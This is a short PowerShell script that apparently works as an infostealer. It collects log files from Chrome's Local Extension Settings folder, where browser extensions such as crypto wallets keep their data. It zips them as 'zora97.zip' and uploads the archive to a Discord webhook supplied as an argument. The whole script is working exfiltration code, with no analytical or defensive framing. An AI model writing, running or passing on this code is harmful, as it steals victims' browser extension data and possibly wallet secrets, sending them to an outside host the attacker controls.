
$discord_webhook_uri = $args[0] #"<your discord webhook uri>"




$extensionPath = "C:\Users\$Env:Username\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings"
$regexPattern = "^0{2,6}[1-9]{1,4}.log" # log file matching pattern


$tempDir = "$Env:TEMP\matched_files"
$zipFilePath = "$tempDir\zora97.zip"

if (-Not (Test-Path -Path $tempDir)) {
    New-Item -ItemType Directory -Path $tempDir
}

# Loop through each extension's settings directory and copy to tmp dir
Get-ChildItem -Path $extensionPath -Recurse -Directory | ForEach-Object {
    $dir = $_
    
    # Find files in the current directory matching the regex pattern
    $files = Get-ChildItem -Path $dir.FullName | Where-Object { $_.Name -match $regexPattern }
    
    foreach ($file in $files) {
        try {
            # Copy the file to the temporary folder
            # echo "Found file: " $file.Fullname # debug
            Copy-Item -Path $file.FullName -Destination $tempDir -Force
        } catch {
            Write-Host "Error copying file: $($file.FullName)"
        }
    }
}

# Create a ZIP file containing all the copied files
if (Test-Path $zipFilePath) {
    Remove-Item $zipFilePath -Force
}
Compress-Archive -Path "$tempDir\*" -DestinationPath $zipFilePath



# Prepare multipart/form-data request to send the zip file
$boundary = [System.Guid]::NewGuid().ToString()

# Read the file content
$fileContent = [System.IO.File]::ReadAllBytes($zipFilePath)

# Create the multipart body
$body = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="zora97.zip"
Content-Type: application/zip

$( [System.Text.Encoding]::Default.GetString($fileContent) )

--$boundary--
"@

# Prepare headers for multipart/form-data
$headers = @{
    "Content-Type" = "multipart/form-data; boundary=$boundary"
}

# Send the request to the Discord webhook
try {
    $response = Invoke-RestMethod -Uri $discord_webhook_uri -Method Post -Headers $headers -Body $body
} catch {
    Write-Host "Error uploading to Discord: $_"
}

# Clean up temporary files
# Remove-Item -Path $tempDir -Recurse -Force